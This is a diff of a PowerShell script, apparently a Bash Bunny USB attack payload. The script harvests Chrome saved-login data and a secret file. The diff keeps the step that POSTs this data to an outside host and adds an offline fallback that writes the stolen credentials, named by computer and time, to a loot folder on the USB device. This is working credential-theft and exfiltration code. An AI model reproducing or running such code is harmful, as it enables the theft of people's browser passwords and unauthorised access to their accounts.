@@ -34,4 +34,13 @@ foreach ($path in $paths) { # iterate through each logindata (if there are more 
 $secret = Get-Content -Path ($source_path + "\secret.txt")
 $encryptedData = ,$secret + $encryptedData
 
-Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
+if(Test-Connection -ComputerName google.com -Quiet) {
+	Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
+} else {
+	$lootPath =  ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\loot\')
+	$lootName = $lootPath + ($env:computername + "_" + (get-date).ToUniversalTime().ToString("yyyyMMddTHHmmss")) + ".json"
+	$encryptedData | ConvertTo-Json | Out-File $lootName
+	if([System.IO.File]::Exists($lootName)) {
+		Write-Host "File written to loot folder.. offline."
+	}
+}
